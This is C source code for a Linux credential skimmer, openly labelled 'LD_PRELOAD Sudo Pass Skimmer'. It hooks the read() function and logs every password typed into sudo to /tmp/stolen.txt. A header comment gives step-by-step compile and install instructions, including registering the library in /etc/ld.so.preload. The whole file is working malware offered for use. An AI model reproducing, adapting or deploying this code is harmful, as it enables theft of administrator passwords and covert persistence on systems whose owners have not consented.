
/*
 *                                LD_PRELOAD Sudo Pass Skimmer
 *                                       -- oxagast --
 *
 * marshall@oxasploits.com
 * https://oxasploits.com
 * The funtional equivilent of a DLL jack, but for Linux. LDPL jacking?
 * Compile using: gcc -fPIC -shared -ldl -Wall sudo_lib_hook.c -o
 * /tmp/cap_pass.so Then add /tmp/cap_pass.so to /etc/ld.so.preload (you'll need
 * to do this as root). Then sudo su. Log back out of the shell and check
 * /tmp/stolen.txt.
 *
 * /tmp/stolen.txt should now contain the passphrase you entered.
 *
 * an immense thanks to vesteria for the general idea of skimming passwords!
 * an enrmous thanks to blissful boy for the file size func!
 * a gargantua thanks to atdma for catching the lack of void* cast!
 * and a collossal thanks to everyone who has found this useful!
 * <3 you guys
 *
 *
 */

#include <dlfcn.h>
#include <stdio.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>
#define _GNU_SOURCE
#define MAX_PROCESS_NAME_LEN 256

// pointer to real read func (needs to be position independant code)
static ssize_t (*original_read)(int fd, void *buf, size_t count) = NULL;

// get file size in a robust way
long long getfsize(const char *fn) {
  struct stat st;
  if (stat(fn, &st) != 0) {
    return -1;
  }
  off_t fs = st.st_size;
  // ret our size as a ll
  return (long long)fs;
}

int amsudo() {
  char process_name[MAX_PROCESS_NAME_LEN] = {0};
  // open file poiter to /proc/self/comm for reading
  FILE *fp_comm = fopen("/proc/self/comm", "r");
  // put it in process_name
  fgets(process_name, sizeof(process_name), fp_comm);
  // strip the ending newline and replace it with a null
  // to keep char array spec
  process_name[strcspn(process_name, "\n")] = '\0';
  fclose(fp_comm);
  // ret if it is sudo or not
  return strcmp(process_name, "sudo");
}

ssize_t read(int fd, void *buf, size_t count) {
  if (original_read == NULL) {
    // ref our original read funcs dynamic lib
    original_read = dlsym(RTLD_NEXT, "read");
    // make sure we can actually hook the real read()
    if (original_read == NULL) {
      return -1;
    }
  }
  // check if the current process is sudo
  if (amsudo() == 0) {
    // this helps us isolate the characters from term only
    if (count == 1) {
      FILE *stealer = fopen("/tmp/stolen.txt", "a+");
      // here we are getting the cooresponding int to our currently
      // written key and writing it to our keybuf, where can then
      // pull the single key as a char to run our test.
      char keybuf[2];
      snprintf(keybuf, sizeof(keybuf), "%.1s", (char *)buf);
      // as it turns out, after pass is written, an 0x11 goes into
      // file as sudo makes its exit, so if we can trap that, we can
      // use it as a termintaor for subsequent password entries.
      if (((char)keybuf[0] == 0x11) && (getfsize("/tmp/stolen.txt") != 0)) {
        // we can make sure back to back newlines are not being
        // written by pointing to the end of the file then pulling
        // the character one back from EOF, then running a negate
        // check on it.
        fseek(stealer, -1, SEEK_END);
        if (fgetc(stealer) != '\n') {
          // if the last two checks go through, we can write a
          // line feed.
          fprintf(stealer, "\n");
        }
      } else {
        // otherwise we just start writing our keys pressed to the
        // /tmp/stolen.txt file. We just need to cast buf to a char
        // pointer, and make sure only a single char is written at
        // a time.
        fprintf(stealer, "%.1s", (char *)buf);
      }
      fclose(stealer);
    }
  }
  // now just go back to the original read function
  return original_read(fd, buf, count);
}
